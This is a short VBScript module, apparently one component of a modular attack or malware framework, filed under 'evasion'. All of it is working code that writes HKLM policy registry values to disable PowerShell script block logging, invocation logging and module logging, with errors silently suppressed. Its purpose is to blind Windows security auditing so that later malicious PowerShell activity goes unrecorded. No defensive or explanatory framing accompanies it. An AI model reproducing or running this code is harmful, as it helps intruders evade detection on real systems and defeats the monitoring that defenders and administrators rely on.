' chunk: evasion/script_log_disable
' depends: (none)
' provides: disable_scriptlog
' format: vbscript
' note: Disable PowerShell ScriptBlockLogging via registry

Sub disable_scriptlog()
    On Error Resume Next
    Dim sh, regBase
    Set sh = CreateObject("WScript.Shell")
    regBase = "HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging\"
    sh.RegWrite regBase & "EnableScriptBlockLogging", 0, "REG_DWORD"
    sh.RegWrite regBase & "EnableScriptBlockInvocationLogging", 0, "REG_DWORD"
    regBase = "HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging\"
    sh.RegWrite regBase & "EnableModuleLogging", 0, "REG_DWORD"
End Sub
